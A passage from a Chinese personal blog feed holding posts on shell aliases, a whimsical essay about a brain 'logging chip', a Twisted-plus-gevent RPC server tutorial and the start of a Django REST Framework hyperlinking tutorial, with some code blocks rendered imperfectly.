<span class="keyword">fi</span></div><div class="line"><span class="keyword">fi</span></div></pre></td></tr></table></figure>
</li>
<li><p>常用的 alias 声明 — 简写部分</p>
<p>比较容易懂。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">alias</span> cls=<span class="string">'clear'</span></div><div class="line"><span class="built_in">alias</span> vi=<span class="string">'vim'</span></div><div class="line"><span class="built_in">alias</span> ll=<span class="string">'ls -l'</span></div><div class="line"><span class="built_in">alias</span> la=<span class="string">'ls -a'</span></div></pre></td></tr></table></figure>
</li>
<li><p>常用的 alias 声明 — 效果增强部分</p>
<p>这部分让 ls 和 grep 都带有关键字亮色的提示，让 alert 提示的错误信息在终端中显示起来更友好。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">alias</span> ls=<span class="string">'ls --color=auto'</span></div><div class="line"><span class="built_in">alias</span> grep=<span class="string">'grep --color=auto'</span></div><div class="line"><span class="built_in">alias</span> alert=<span class="string">'notify-send --urgency=low -i "$([ $? = 0 ] &amp;&amp; echo terminal || echo error)" "$(history|tail -n1|sed -e '</span>\<span class="string">''</span>s/^\s*[0-9]\+\s*//;s/[;&amp;|]\s*alert$//<span class="string">'\'</span><span class="string">')"'</span></div></pre></td></tr></table></figure>
</li>
<li><p>常用的 alias 声明 — 效果增强部分2</p>
<p>这部分增加了在 MacOS 系统中显示和隐藏文件的快捷命令，和在终端中切换 bash 和 zsh 的快捷命令。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">alias</span> showfile=<span class="string">'defaults write com.apple.finder AppleShowAllFiles -boolean true ; killall Finde    r'</span></div><div class="line"><span class="built_in">alias</span> hidefile=<span class="string">'defaults write com.apple.finder AppleShowAllFiles -boolean false ; killall Find    er'</span></div><div class="line"><span class="built_in">alias</span> switchbash=<span class="string">'chsh -s /bin/bash'</span></div><div class="line"><span class="built_in">alias</span> switchzsh=<span class="string">'chsh -s /bin/zsh'</span></div></pre></td></tr></table></figure>
</li>
</ul>
<p>全部的配置汇总如上，一是方便我自己做个备份，二是大家可以按需使用。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[如何大脑有一套日志系统就好了]]></title>
      <url>http://lexuslee.me/2016/07/16/%E5%A6%82%E6%9E%9C%E5%A4%A7%E8%84%91%E6%9C%89%E4%B8%80%E5%A5%97%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E5%B0%B1%E5%A5%BD%E4%BA%86/</url>
      <content type="html"><![CDATA[<h2 id="如果大脑有一套日志系统就好了"><a href="#如果大脑有一套日志系统就好了" class="headerlink" title="如果大脑有一套日志系统就好了"></a>如果大脑有一套日志系统就好了</h2><p><img src="http://img31.mtime.cn/pi/2016/07/08/101238.71445696_1000X1000.jpg" alt="大鱼海棠"></p>
<center><br><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="http://music.163.com/outchain/player?type=2&id=28285910&auto=1&height=66"></iframe><br></center>

<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>最近很健忘，今天下午撸代码的时候，基本上每执行一个模块就要将调用函数、执行结果、友好信息等记录到日志系统里。</p>
<p>然后我突然想到，如果生物的大脑有一套日志系统就好了!</p>
<a id="more"></a>
<p>数千年后，虽然不知道人类迭代更替得如何，但是到时候的智慧生物只需要读取我们这种远古生物的日志系统，就可以看到这个人(或者动物)的一生。</p>
<p>跟传记一样，像一部电影。</p>
<p>对于我这种极其害怕死了之后被遗忘的动物来说，实在很兴奋。</p>
<h3 id="我是这么细想的"><a href="#我是这么细想的" class="headerlink" title="我是这么细想的"></a>我是这么细想的</h3><h4 id="为啥？"><a href="#为啥？" class="headerlink" title="为啥？"></a>为啥？</h4><p>我如果想去了解某个已故的人，如果是名人，辣么可以找到他的传记或者史记等资料等，方式很多。</p>
<p>但如果是不出名并且也没有写自传的习惯的人，辣么我可能会去找他的后裔，然后通过不那么客观的角度来了解那个人。甚至，我可能根本找不到方式去了解这个人。</p>
<p>这对于不容易在历史上留名的人来说不公平。</p>
<p>我觉得每个人都值得被记录下来，平凡的人自然有平凡的人会去在乎，在他死后有渠道去查看他的一生。</p>
<h4 id="咋整？"><a href="#咋整？" class="headerlink" title="咋整？"></a>咋整？</h4><p>在每个人刚出生的时候，</p>
<p>在身体上某个部位，这个部位随年龄递增缩产生的变动不大，在这个部位植入一块芯片。</p>
<ul>
<li>(最佳选择)这块芯片能否通过某种信号，和大脑产生联系，从而能够自动记录日志。</li>
</ul>
<ul>
<li>(次之)如果不能与大脑产生联系，辣么就用手动录入日志。但是手动录入日志的话，可能有哪天我偷懒，或者我忘记了，而错过了关键信息。</li>
</ul>
<p>这样一段时间(可能是一天，也可能是完成某件事情，或者触发了某个事件，或者未来时间的计数单位)结束，我能够在脑子里(回顾?)记录下我今天进行的行为(甚至可以细化到大脑的活动，产生的思维的记录？)</p>
<p>举个栗子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">e.g.(</div><div class="line">	[2016.07.10 16:17 小虚 &gt; 由于写代码时烦躁分心胡思乱想产生了奇怪的想法，并且怕自己健忘，于是在&quot;简书&quot;边听着 Adam Levine 的歌边写了一篇名为《如果大脑有一套日志系统就好了》的 blog ]</div><div class="line">)</div></pre></td></tr></table></figure>
<p>其中记录方式，可能是通过在脑袋里思考时产生的某种信号，解析后在芯片里进行读写… (进入瞎编模式！)</p>
<p>估计实现不了，辣么手工录入日志还是比较容易的！</p>
<p>虽然这种方式不很便捷。</p>
<p>这就会产生一个问题：芯片容量的问题。</p>
<p>万一遇到话唠型选手咋整？</p>
<p>一天能整个 10 万字的大新闻。</p>
<p>我一开始的想法是容量尽量大的芯片，但是这样成本高，不如限制字数吧。</p>
<p>正好我喜欢情多话少的 ：D</p>
<p>最后，</p>
<p>在人死后，焚烧之前，取出这块芯片，使用某种储存方式保存起来。</p>
<p>数千年后，人们想了解我，只需要读取这块芯片，就能知道我每一天做了什么，我在想什么…</p>
<h4 id="可能出现的问题"><a href="#可能出现的问题" class="headerlink" title="可能出现的问题"></a>可能出现的问题</h4><ol>
<li>记录日志时带有不真实性。也就是说，你甚至可以胡扯出今天一天做了什么事儿。比如我可以说: 我今天和高圆圆一起去看了《大鱼海棠》，我感到小鹿乱撞。</li>
<li>在婴儿期，还没有成形的意识，以及在老年期，意识不清晰了，无法记录日志，这段时间的日志是空白的。</li>
<li>语言问题。这个好说，现在翻译引擎很屌了。</li>
<li>是否应该允许他人能编辑本人的日志？不应该。</li>
<li>日志系统是个芯片，总有办法被摧毁的，如果遇到恶性事件，那是无可奈何的。</li>
<li>具体如何记录的实现问题。</li>
</ol>
<p><strong>嗯，就酱！</strong></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Twisted+gevent 异步+协程服务器开发]]></title>
      <url>http://lexuslee.me/2016/07/04/2016-07-01-rpc-server/</url>
      <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>最近接触到用 Twisted 来写个 RPC 服务器，对高并发、性能和大量长连接时的稳定性方面有要求，所以应该在 Twisted 的基础上再造些轮子，最后考虑用 Twisted + gevent 来实现 「异步+协程」的部分。</p>
<a id="more"></a>
<p>分别简要介绍下 Twisted 和 gevent。</p>
<h2 id="Twisted"><a href="#Twisted" class="headerlink" title="Twisted"></a>Twisted</h2><p>Twisted是用 Python 实现的基于事件驱动的异步的网络引擎框架。它封装了大部分主流的网络协议(传输层或应用层)，如 TCP、UDP、SSL/TLS、HTTP、IMAP、SSH、IRC以及FTP等，在这我主要会用到 TCP 协议。</p>
<p>使用 Twisted 的好处在于，它是以事件驱动编程实现的，所以提供了事件注册的回调函数的接口，每次接受到请求，获得了事件通知，就调用事件所注册的回调函数( Node.js 程序员可能比较熟悉)。这让我不必去操心服务器事件驱动的编写。</p>
<p>并且，在网络引擎方面，有心跳包和粘包的三方库，非常完善。</p>
<p>然而，Twisted 有一个缺陷，它的异步有点问题，单个连接建立后是一个进程，在进程里用多线程实现并发，但多个连接建立后仍然会出现同步阻塞的情况，所以这就要引入 gevent 来填充其性能上的缺陷。</p>
<h2 id="gevent"><a href="#gevent" class="headerlink" title="gevent"></a>gevent</h2><p>gevent 是一种基于协程的 Python 网络库，它用到 greenlet 提供的，封装了 libevent 事件循环的高层同步API。</p>
<p>如果你不知道什么是协程，那么可以简单这么理解：</p>
<p>协程就是由程序员自己编码实现调度的多线程。</p>
<p>而 gevent 对 greenlet 协程进行了封装，同时 gevent 提供了看上去非常像传统的基于线程模型编程的接口，但是在隐藏在下面做的是异步 I/O ，所以它以同步的编码实现了异步的功能。</p>
<p>##开搞</p>
<h3 id="Step-1-完成基础框架"><a href="#Step-1-完成基础框架" class="headerlink" title="Step 1 完成基础框架"></a>Step 1 完成基础框架</h3><p>首先由于我要编写一个 RPC 服务器(使用 TCP 协议)，所以需要先实现一个 TCP 服务器。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># server.py</span></div><div class="line"><span class="keyword">from</span> twisted.internet.protocol <span class="keyword">import</span> ServerFactory, ProcessProtocol</div><div class="line"><span class="keyword">from</span> twisted.protocols.basic <span class="keyword">import</span> LineReceiver</div><div class="line"><span class="keyword">from</span> twisted.internet <span class="keyword">import</span> reactor</div><div class="line"></div><div class="line">PORT = <span class="number">5354</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">CmdProtocol</span><span class="params">(LineReceiver)</span>:</span></div><div class="line">    client_ip = <span class="string">''</span></div><div class="line">    </div><div class="line">    <span class="comment"># 连接建立接口</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">connectionMade</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="comment"># 获得连接对端 ip</span></div><div class="line">        self.client_ip = self.transport.getPeer().host</div><div class="line">        print(<span class="string">"Client connection from %s"</span> % self.client_ip)</div><div class="line">  </div><div class="line">    <span class="comment"># 连接断开接口</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">connectionLost</span><span class="params">(self, reason)</span>:</span></div><div class="line">        print(<span class="string">'Lost client connection. Reason: %s'</span> % reason)</div><div class="line"></div><div class="line">    <span class="comment"># 数据接收接口</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dataReceived</span><span class="params">(self, data)</span>:</span></div><div class="line">        print(<span class="string">'Cmd received from %s : %s'</span> % (self.client_ip, data))</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">RPCFactory</span><span class="params">(ServerFactory)</span>:</span></div><div class="line">    <span class="comment"># 使用 CmdProtocol 与客户端通信</span></div><div class="line">    protocol = CmdProtocol</div><div class="line"></div><div class="line"><span class="comment"># 启动服务器</span></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    reactor.listenTCP(PORT, RPCFactory())</div><div class="line">    reactor.run()</div></pre></td></tr></table></figure>
<p>Twisted 提供3个非常基础的接口使程序员进行重写:</p>
<ul>
<li>connectionMade() 连接建立后执行操作 </li>
<li>connectionLost() 连接断开后执行操作</li>
<li>dataReceived() 接收到数据后触发操作</li>
</ul>
<p>这3个接口通常来说是必须的，以此基础上进行完善，可以看到我只是先输出了友好信息。</p>
<p>这样简单完成了一个 TCP 服务器，可以看出 Twisted 网络引擎的架构如下：</p>
<ol>
<li>先由程序员来制定一个或多个协议(该协议可以继承各种底层网络协议)。</li>
<li>接着指定唯一一个工厂，这个工厂必须声明使用的协议对象。</li>
<li>使用 reactor 选择监听模式、监听工厂和端口，开启服务器。</li>
</ol>
<h3 id="Step-2-完善基础框架"><a href="#Step-2-完善基础框架" class="headerlink" title="Step 2 完善基础框架"></a>Step 2 完善基础框架</h3><p>显然，这个 TCP 服务器基础框架显得有些单薄，我首先想到的是需要进行多客户端的控制及 ip 记录，故应有个队列来实时更新连接入服务器的 ip。</p>
<p>并且，最近有好几部电影在豆瓣我标记了，我想和高圆圆一起去看，所以不能一直盯着屏幕来观察反馈，所以需要一个日志系统来记录反馈信息。</p>
<p>故增加一个 log.py 日志系统文件：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># log.py</span></div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> logging</div><div class="line"><span class="keyword">import</span> logging.handlers</div><div class="line"><span class="keyword">from</span> twisted.python <span class="keyword">import</span> log</div><div class="line"></div><div class="line"><span class="comment">#当前执行文件所在地址</span></div><div class="line">CURRENT_PATH = os.getcwd()</div><div class="line"><span class="comment">#日志文件路径</span></div><div class="line">LOG_FILE = CURRENT_PATH + <span class="string">'/rpcserver.log'</span></div><div class="line"><span class="comment"># 全局日志模块</span></div><div class="line">gl_logger = <span class="keyword">None</span> </div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">log</span><span class="params">(Protocol)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">init_log</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">global</span> gl_logger</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        os.makedirs(os.path.dirname(LOG_FILE))</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">pass</span></div><div class="line">    <span class="comment"># 实例化handler </span></div><div class="line">    handler = logging.handlers.RotatingFileHandler(LOG_FILE, maxBytes=<span class="number">1024</span> * <span class="number">1024</span>, backupCount=<span class="number">1</span>)   </div><div class="line">    fmt = <span class="string">'[%(asctime)s][%(levelname)s][%(filename)s:%(lineno)d:%(funcName)s] - %(message)s'</span>    </div><div class="line">     <span class="comment"># 实例化formatter</span></div><div class="line">    formatter = logging.Formatter(fmt)</div><div class="line">    <span class="comment"># 为handler添加formatter</span></div><div class="line">    handler.setFormatter(formatter)</div><div class="line">    <span class="comment"># 获取名为rpcserver的logger</span></div><div class="line">    gl_logger = logging.getLogger(<span class="string">'rpcserver'</span>)</div><div class="line">    <span class="comment"># 为logger添加handler    </span></div><div class="line">    loggergl_logger.addHandler(handler)</div><div class="line">    handlergl_logger.setLevel(logging.DEBUG)</div><div class="line"></div><div class="line">    gl_logger.info(<span class="string">"----------------------------------"</span>)</div></pre></td></tr></table></figure>
<p>并在 server.py 中添加如下代码：<br>(添加多连接控制，把 print 替换为 log.msg 来打印日志)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># server.py</span></div><div class="line"><span class="keyword">from</span> twisted.internet.protocol <span class="keyword">import</span> ServerFactory, ProcessProtocol</div><div class="line"><span class="keyword">from</span> twisted.protocols.basic <span class="keyword">import</span> LineReceiver</div><div class="line"><span class="keyword">from</span> twisted.internet <span class="keyword">import</span> reactor</div><div class="line"><span class="keyword">from</span> twisted.python <span class="keyword">import</span> log</div><div class="line"></div><div class="line">PORT = <span class="number">5354</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">CmdProtocol</span><span class="params">(LineReceiver)</span>:</span></div><div class="line">    client_ip = <span class="string">''</span></div><div class="line">    </div><div class="line">    <span class="comment"># 连接建立接口</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">connectionMade</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="comment"># 获得连接对端 ip</span></div><div class="line">        self.client_ip = self.transport.getPeer().host</div><div class="line">        log.msg(<span class="string">"Client connection from %s"</span> % self.client_ip)</div><div class="line">        </div><div class="line">        <span class="comment"># 进行多连接控制</span></div><div class="line">        <span class="keyword">if</span> len(self.factory.clients) &gt;= self.factory.clients_max:</div><div class="line">            log.msg(<span class="string">"Too many connections. Disconnect!"</span>)</div><div class="line">            self.client_ip = <span class="keyword">None</span></div><div class="line">            self.transport.loseConnection()</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            self.factory.clients.append(self.client_ip)</div><div class="line">  </div><div class="line">    <span class="comment"># 连接断开接口</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">connectionLost</span><span class="params">(self, reason)</span>:</span></div><div class="line">        log.msg(<span class="string">'Lost client connection. Reason: %s'</span> % reason)</div><div class="line">        <span class="keyword">if</span> self.client_ip:</div><div class="line">            self.factory.clients.remove(self.client_ip)</div><div class="line"></div><div class="line">    <span class="comment"># 数据接收接口</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dataReceived</span><span class="params">(self, data)</span>:</span></div><div class="line">        log.msg(<span class="string">'Cmd received from %s : %s'</span> % (self.client_ip, data))</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">RPCFactory</span><span class="params">(ServerFactory)</span>:</span></div><div class="line">    <span class="comment"># 使用 CmdProtocol 与客户端通信</span></div><div class="line">    protocol = CmdProtocol</div><div class="line">    </div><div class="line">    <span class="comment"># 设置最大连接数</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, clients_max=<span class="number">10</span>)</span>:</span></div><div class="line">        self.clients_max = clients_max</div><div class="line">        self.clients = []</div><div class="line"></div><div class="line"><span class="comment"># 启动服务器</span></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    log.startLogging(sys.stdout)</div><div class="line">    reactor.listenTCP(PORT, RPCFactory())</div><div class="line">    reactor.run()</div></pre></td></tr></table></figure>
<h3 id="Step-3-增加-rpc-实例"><a href="#Step-3-增加-rpc-实例" class="headerlink" title="Step 3 增加 rpc 实例"></a>Step 3 增加 rpc 实例</h3><p>既然是 rpc 服务器，辣么接下来就要实现一个简单的远程命令调用，既然之前写了日志模块，那就写一个对应的远程日志查看调用吧！</p>
<p>对了，写到这里，已经是 02：53 了，我不知道为什么开始胡思乱想起来。</p>
<p>我想大概是因为越是无端的，越是会心念着…</p>
<p><img src="https://img1.doubanio.com/view/status/median/public/e818b8c2b37c179.jpg" alt="飘渺心事"></p>
<p>嗷，跑题了…</p>
<p>远程调用呢， Twisted 提供了一个敲好用的子进程父类 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">这个类提供了2个接口:</div><div class="line"></div><div class="line">- outReceived 用来接收和外发数据</div><div class="line">- processEnded 进程结束回调</div><div class="line"></div><div class="line">于是，我在 server.py 中加入以下代码:</div><div class="line"></div><div class="line">``` python</div><div class="line"># 打印日志</div><div class="line">class TailProtocol(ProcessProtocol):</div><div class="line">    def __init__(self, write_callback):</div><div class="line">        self.write = write_callback</div><div class="line">    </div><div class="line">    def outReceived(self, data):</div><div class="line">        self.write(&quot;Begin logger\n&quot;)</div><div class="line">        data = [line for line in data.split(&apos;\n&apos;) if not line.startswith(&apos;==&apos;)]</div><div class="line">        for d in data:</div><div class="line">            self.write(d + &apos;\n&apos;)</div><div class="line">        self.write(&quot;End logger\n&quot;)</div><div class="line"></div><div class="line">     def processEnded(self, reason):</div><div class="line">        if reason.value.exitCode != 0:</div><div class="line">            log.msg(reason)</div></pre></td></tr></table></figure></p>
<p>循环读取日志文件中每一行并输出信息。</p>
<p>接着在 CmdProtocol 类中加入以下函数:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 根据 cmd 执行相应操作</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">processCmd</span><span class="params">(self, line)</span>:</span></div><div class="line">      <span class="keyword">if</span> line.startwith(<span class="string">'getlog'</span>):</div><div class="line">          tailProtocol = TailProtocol(self.transport.write)</div><div class="line">          <span class="comment"># 打印rpcserver.log日志</span></div><div class="line">          reactor.spawnProcess(tailProtocol, <span class="string">'/usr/bin/tail'</span>, args=[<span class="string">'/usr/bin/tail'</span>, <span class="string">'-10'</span>, <span class="string">'/var/log/rpcserver.log'</span>])</div></pre></td></tr></table></figure>
<p>通过获取远程发送来的命令 「getlog」 触发了以下事件 tailProtocol ，并调用 TailProtocol 类中的回调函数 outReceived 来循环读取日志文件中每一行并输出日志信息，返回给客户端。</p>
<p>同理，其余 RPC 远程调用实例也可类似的编写。</p>
<p>注意，这里使用了 Twisted 自带的 <figure class="highlight plain"><figcaption><span>来处理事件回调，并新建一个线程来执行函数，这就是单个连接中并发的实现。</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">### Step 4 加入 gevent 协程部分</div><div class="line"></div><div class="line">首先我考虑的是使用一个队列来储存每次接收到事件触发的钩子后，把钩子接收的参数存入队列中，再用 gevent 的协程来进行任务的分发。</div><div class="line"></div><div class="line">直接上代码：</div><div class="line"></div><div class="line">``` python</div><div class="line"># server.py</div><div class="line">import geventfrom gevent.queue</div><div class="line">import Queue</div><div class="line"></div><div class="line"># 任务队列</div><div class="line">tasks = Queue() </div><div class="line"></div><div class="line">class CmdProtocol(LineReceiver):</div><div class="line">      def worker(self, target):</div><div class="line">          while not tasks.empty():</div><div class="line">            task = tasks.get()</div><div class="line">            log.msg(&apos;User %s got task %s&apos; % (target, task))</div><div class="line">            self.processCmd(task)</div><div class="line">            gevent.sleep(0)</div><div class="line"></div><div class="line">      def dispatch(self, data):</div><div class="line">          tasks.put_nowait(data)</div><div class="line">      </div><div class="line">      def dataReceived(self, data):</div><div class="line">          log.msg(&apos;Cmd received from %s : %s&apos; % (self.client_ip, data))</div><div class="line">          gevent.spawn(self.dispatch, data).join()</div><div class="line">          gevent.spawn(self.worker, self.client_ip)</div></pre></td></tr></table></figure></p>
<p>首先， gevent 的队列 Queue 有两个主要的方法 <code>get()</code> 和 <code>put()</code> 来对队列中的元素进行读和写。<code>put_nowait()</code> 相当于 <code>put()</code> 的无阻塞模式。</p>
<p>在 <code>dispatch()</code> 中，我把每个收到的 data 的 trigger 放入任务队列中，使其进入等待分发的状态。</p>
<p>接着，协程会执行下一步 <code>worker()</code>从任务队列中取出相应的 trigger ，传入 <code>processCmd</code> 中触发回调，执行相应的函数。</p>
<p>执行完后，协程会回到上一步 <code>dispatch()</code> 接着再到 <code>worker()</code>  这样交替轮循，直到任务列表里的任务全部执行完为止，这个过程中，各个任务执行是独立的，不会造成阻塞，吊！</p>
<h2 id="欧勒！"><a href="#欧勒！" class="headerlink" title="欧勒！"></a>欧勒！</h2><p>就酱，我们撸出了一个高性能的、协程的、异步的 RPC 服务器！</p>
<p><img src="http://7xse6j.com1.z0.glb.clouddn.com/twisted.png" alt="rpcserver"></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Django REST Framework 5-关联性和超链接]]></title>
      <url>http://lexuslee.me/2016/04/06/2016-04-06-DRF-tutorial-5-relations/</url>
      <content type="html"><![CDATA[<h2 id="关联性和超链接"><a href="#关联性和超链接" class="headerlink" title="关联性和超链接"></a>关联性和超链接</h2><p>之前我们的 api 都是用外键关联，然而实际上用超链接的方式更符合 RESTful 的思想。</p>
<p>所以在这一章中我们将要用超链接(代替外键的方式)来提高关联性。</p>
<h3 id="为-api-提供根路径"><a href="#为-api-提供根路径" class="headerlink" title="为 api 提供根路径"></a>为 api 提供根路径</h3><p>由于要采用超链接的方式，而之前我们的 ‘movies’ / ‘directors’ / ‘users’ 虽然有了 endpoints ，但 api 本身却没有一个整体的根路径，所以我们使用 <figure class="highlight plain"><figcaption><span>装饰器来创建一个根路径。</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">在 ```douban/views.py``` 中添加如下代码: </div><div class="line">&lt;!--more--&gt;</div><div class="line"></div><div class="line">```python</div><div class="line">from rest_framework.decorators import api_view</div><div class="line">from rest_framework.response import Response</div><div class="line">from rest_framework.reverse import reverse</div><div class="line"></div><div class="line"># api 根目录</div><div class="line">@api_view([&apos;GET&apos;])</div><div class="line">def api_root(request, format=None):</div><div class="line">    return Response(&#123;</div><div class="line">        &apos;user&apos;: reverse(&apos;user-list&apos;, request=request, format=format),</div><div class="line">        &apos;movies&apos;: reverse(&apos;movies-list&apos;, request=request, format=format),</div><div class="line">        &apos;director&apos;: reverse(&apos;director-list&apos;, request=request, format=format)</div><div class="line">    &#125;)</div></pre></td></tr></table></figure></p>
<p>在这里需要注意两样东西：</p>
<ol>
<li>我们用了 DRF 的 <figure class="highlight plain"><figcaption><span>方法而不是 Django 自带的 ```reverse``` 方法来返回一个正确的 URLs。</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">2. 此时如果打开 Web api 界面会报错, 因为我们还没有为 url 进行绑定， 稍后我们会添加。</div><div class="line"></div><div class="line">接着在 ```doubt/urls.py``` 中添加对应路径</div><div class="line"></div><div class="line">```python</div><div class="line">url(r&apos;^$&apos;, views.api_root),</div></pre></td></tr></table></figure></li>
</ol>
<h3 id="使用炫酷的超链接"><a href="#使用炫酷的超链接" class="headerlink" title="使用炫酷的超链接"></a>使用炫酷的超链接</h3><p>DRF 提供了以下几种方式来处理实体间的关系:</p>
<ul>
<li>主键</li>
<li>超链接</li>
<li>相关项使用单一标识符</li>
<li>相关项默认文本信息</li>
<li>子项在母项中显示出来</li>
<li>其他方式</li>
</ul>
<p>在这个栗子中我们使用超链接的方式来处理实体关系。</p>
